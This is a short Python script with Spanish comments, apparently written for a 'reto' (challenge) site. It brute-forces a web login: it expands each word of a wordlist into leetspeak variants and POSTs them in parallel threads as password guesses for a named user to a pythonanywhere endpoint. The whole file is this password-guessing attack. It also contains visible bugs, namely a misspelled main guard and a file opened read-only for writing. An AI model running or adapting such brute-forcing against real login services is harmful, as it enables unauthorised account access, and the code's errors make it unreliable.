import sys
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from itertools import product

URL = "https://xl666.pythonanywhere.com/reto"
max_retries = 3

############ FUNCIONES DE CAMBIO ############
def generar_variantes(cadena):
    # Diccionario de caracteres a cambiar
    cambios = {
        'e': ['e', '3'],
        'i': ['i', '1'],
        'o': ['o', '0']
    }
    
    # Creamos una lista para almacenar las posibles variantes de cada caracter
    opciones = []
    
    # Recorremos la cadena y si encontramos 'e', 'i' o 'o', añadimos sus posibles reemplazos
    for char in cadena:
        if char in cambios:
            opciones.append(cambios[char])  # Añadimos las opciones posibles (ej: ['e', '3'])
        else:
            opciones.append([char])  # Si no es 'e', 'i' o 'o', se queda igual
    
    # Usamos product para generar todas las combinaciones posibles
    variantes = [''.join(variacion) for variacion in product(*opciones)]
    return variantes

############ PETICION POST ############
def enviar_post(passwords):
    for palabra in passwords:
        retry_count = 0
        while retry_count < max_retries:
            try:
                with requests.session() as sesion:
                    datos = {'nombre': 'Sebastian', 'nick': 'zs21015916', 'pass': palabra}
                    respuesta = sesion.post(URL, data=datos, timeout=5)
                    time.sleep(.5)
                    if respuesta.status_code == 200:
                        print(f"PASSWORD --> {datos['pass']}")
                        with open('listado-general.txt', 'r') as contra:
                            contra.write(f"{palabra}\n")
                        sys.exit(0)
                    else:
                        print(f"{respuesta.status_code} {datos['pass']}")
                break  # Sale del while si la petición fue exitosa
            except Exception as e:
                retry_count += 1
                print(f"Error: {e}, retry {retry_count}/{max_retries}")

############ PROCESAMIENTO DE LINEA ############
def procesar_linea(line):
    line = line.rstrip()  # Eliminar espacios al final
    return generar_variantes(line)

if _name_ == "_main_":
    if len(sys.argv) < 2:
        print("Debe proporcionar el archivo de entrada como argumento.")
        sys.exit(1)

    with open(sys.argv[1]) as file:
        lineas = file.readlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        for line in lineas:
            conjunto_variantes = procesar_linea(line)
            executor.submit(enviar_post, conjunto_variantes)
